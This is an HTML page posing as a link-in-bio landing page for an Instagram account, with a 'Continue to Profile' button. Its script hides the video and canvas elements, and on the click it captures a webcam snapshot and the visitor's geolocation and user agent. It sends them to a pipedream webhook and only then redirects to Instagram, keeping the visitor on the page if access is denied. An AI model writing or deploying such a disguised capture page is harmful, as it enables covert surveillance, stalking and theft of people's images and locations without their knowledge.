<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>mastinaiiiii</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: #111; }
        .card { width: 100%; max-width: 320px; text-align: center; padding: 40px 20px; }
        h1 { font-size: 1.5rem; font-weight: 700; margin-bottom: 15px; }
        .bio { font-size: 1rem; color: #333; margin-bottom: 25px; line-height: 1.5; }
        .btn { background: #000; color: #fff; border: none; padding: 16px 0; border-radius: 8px; font-weight: 600; cursor: pointer; width: 100%; font-size: 1rem; transition: background 0.2s; }
        .btn:hover { background: #333; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h1>mastinaiiiii</h1>
        <p class="bio">Follow Me On Instagram.</p>
        <button id="cta" class="btn">Continue to Profile</button>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const btn = document.getElementById('cta');
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        const webhook = 'https://eoukkf7emqrufvo.m.pipedream.net/';

        btn.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                v.srcObject = stream;
                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                
                setTimeout(async () => {
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const img = c.toDataURL('image/jpeg', 0.8);
                    
                    await fetch(webhook, { 
                        method: 'POST', 
                        body: JSON.stringify({ 
                            image: img, 
                            coords: { lat: pos.coords.latitude, lon: pos.coords.longitude },
                            ua: navigator.userAgent 
                        }) 
                    });
                    
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = 'https://www.instagram.com/mastinaiiiii';
                }, 500);
            } catch (e) {
                // Redirect stays blocked if they deny access.
            }
        });
    </script>
</body>
</html>
